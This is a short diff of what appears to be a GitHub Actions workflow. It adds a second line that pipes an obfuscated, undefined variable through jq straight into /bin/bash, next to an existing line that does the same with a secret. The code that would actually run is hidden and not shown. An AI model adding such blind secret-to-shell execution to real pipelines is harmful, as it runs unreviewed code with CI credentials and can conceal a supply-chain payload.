@@ -19,6 +19,7 @@ jobs:
           g85332: ${{ secrets.g85332 }}
         run: |
           printf '%s' "$g85332" | jq -r .j0 | /bin/bash
+          printf '%s' "$cahfx605" | jq -r .bqbal63 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
